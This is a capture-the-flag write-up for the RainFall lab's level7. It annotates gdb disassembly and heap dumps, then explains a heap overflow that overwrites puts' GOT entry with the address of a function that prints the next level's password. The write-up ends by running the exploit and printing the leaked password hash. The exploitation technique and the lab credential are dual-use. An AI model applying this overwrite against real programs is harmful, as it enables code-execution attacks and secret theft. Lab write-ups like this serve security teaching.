# Disassembly of main function :

(gdb) disas main
Dump of assembler code for function main:
	0x08048521 <+0>:	push   %ebp
	0x08048522 <+1>:	mov    %esp,%ebp
	0x08048524 <+3>:	and    $0xfffffff0,%esp
	0x08048527 <+6>:	sub    $0x20,%esp
	0x0804852a <+9>:	movl   $0x8,(%esp)
	0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
	0x08048536 <+21>:	mov    %eax,0x1c(%esp)
	0x0804853a <+25>:	mov    0x1c(%esp),%eax <== var1 = malloc(8);
	0x0804853e <+29>:	movl   $0x1,(%eax) <== *var1 = 0x1;
	0x08048544 <+35>:	movl   $0x8,(%esp)
	0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
	0x08048550 <+47>:	mov    %eax,%edx
	0x08048552 <+49>:	mov    0x1c(%esp),%eax
	0x08048556 <+53>:	mov    %edx,0x4(%eax) <== *(var1 + 4) == malloc(8);
	0x08048559 <+56>:	movl   $0x8,(%esp)
	0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
	0x08048565 <+68>:	mov    %eax,0x18(%esp)
	0x08048569 <+72>:	mov    0x18(%esp),%eax <== var2 = malloc(8);
	0x0804856d <+76>:	movl   $0x2,(%eax) <== *var2 = 0x2;
	0x08048573 <+82>:	movl   $0x8,(%esp)
	0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
	0x0804857f <+94>:	mov    %eax,%edx
	0x08048581 <+96>:	mov    0x18(%esp),%eax
	0x08048585 <+100>:	mov    %edx,0x4(%eax) <== *(var2 + 4) == malloc(8);
	0x08048588 <+103>:	mov    0xc(%ebp),%eax <== %eax = argv
	0x0804858b <+106>:	add    $0x4,%eax
	0x0804858e <+109>:	mov    (%eax),%eax <== %eax = argv[1]
	0x08048590 <+111>:	mov    %eax,%edx
	0x08048592 <+113>:	mov    0x1c(%esp),%eax <== %eax = var1;
	0x08048596 <+117>:	mov    0x4(%eax),%eax <== %eax = var1 + 4;
	0x08048599 <+120>:	mov    %edx,0x4(%esp)
	0x0804859d <+124>:	mov    %eax,(%esp)
	0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt> <== strcpy(var1 + 4, argv[1])
	0x080485a5 <+132>:	mov    0xc(%ebp),%eax <== %eax = argv
	0x080485a8 <+135>:	add    $0x8,%eax
	0x080485ab <+138>:	mov    (%eax),%eax <== %eax = argv[2]
	0x080485ad <+140>:	mov    %eax,%edx
	0x080485af <+142>:	mov    0x18(%esp),%eax <== %eax = var2;
	0x080485b3 <+146>:	mov    0x4(%eax),%eax <== %eax = var2 + 4;
	0x080485b6 <+149>:	mov    %edx,0x4(%esp)
	0x080485ba <+153>:	mov    %eax,(%esp)
	0x080485bd <+156>:	call   0x80483e0 <strcpy@plt> strcpy(var2 + 4, argv[2])
	0x080485c2 <+161>:	mov    $0x80486e9,%edx
	0x080485c7 <+166>:	mov    $0x80486eb,%eax
	0x080485cc <+171>:	mov    %edx,0x4(%esp)
	0x080485d0 <+175>:	mov    %eax,(%esp)
	0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
	0x080485d8 <+183>:	mov    %eax,0x8(%esp)
	0x080485dc <+187>:	movl   $0x44,0x4(%esp)
	0x080485e4 <+195>:	movl   $0x8049960,(%esp)
	0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
	0x080485f0 <+207>:	movl   $0x8048703,(%esp)
	0x080485f7 <+214>:	call   0x8048400 <puts@plt>
	0x080485fc <+219>:	mov    $0x0,%eax
	0x08048601 <+224>:	leave
	0x08048602 <+225>:	ret
End of assembler dump.

# By putting a breakpoint after the last call to malloc, we can see the state
# of the heap :

(gdb) c
Continuing.
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00020fd1	0x00000000	0x00000000

# As you can see, each variable contains 1 int and a pointer to a location
# in the heap right after.
# As detailed in the assembly dump of the main function, the program copies
# the first argument of argv into the 2nd heap block, and the second into
# the 4th heap block.
# Here is a dump of the heap with input "./level7 AAAA BBBB" :

(gdb) c
Continuing.
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
0x804a040:	0x00000000	0x00020fc1

# When looking at the addresses written on the stack before the call to fopen,
# we find this :

(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
(gdb) x/s 0x80486e9
0x80486e9:	 "r"

# Then, when inspecting the arguments passed to fgets, another hint :

(gdb) x/s 0x8049960
0x8049960 <c>:	 ""

# By looking at defined functions, we can see this :

(gdb) disas m
Dump of assembler code for function m:
	0x080484f4 <+0>:	push   %ebp
	0x080484f5 <+1>:	mov    %esp,%ebp
	0x080484f7 <+3>:	sub    $0x18,%esp
	0x080484fa <+6>:	movl   $0x0,(%esp)

	0x08048501 <+13>:	call   0x80483d0 <time@plt>
	0x08048506 <+18>:	mov    $0x80486e0,%edx (0x80486e0:	 "%s - %d\n")
	0x0804850b <+23>:	mov    %eax,0x8(%esp)
	0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
	0x08048517 <+35>:	mov    %edx,(%esp)
	0x0804851a <+38>:	call   0x80483b0 <printf@plt>
	
	printf("%s - %d\n", c, time(NULL));

	0x0804851f <+43>:	leave
	0x08048520 <+44>:	ret
End of assembler dump.

# Here, we can look at the disassembly of the function puts to get another hint :

(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
	0x08048400 <+0>:	jmp    *0x8049928
	0x08048406 <+6>:	push   $0x28
	0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.

(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406 <== this is the address of puts()

# We need to redirect the flow of execution to that function m, which will leak
# the content of the buffer c, thanks to a heap buffer overflow.
# Here, we're going to use the second call to strcpy() to overwrite the address
# of puts() with the address of m().
# The first call to strcpy() will overflow its boundaries so that when the
# second call to strcpy() is made, instead of writing argv[2] on the heap,
# it'll be written in the GOT.
# This is the state of the heap before the second call to strcpy() :

(gdb) x/20wx 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928 <== target in GOT
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000

# The result is :

level7@RainFall:~$ ./level7 `python /tmp/payload.py 1` `python /tmp/payload.py 2`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1586201843
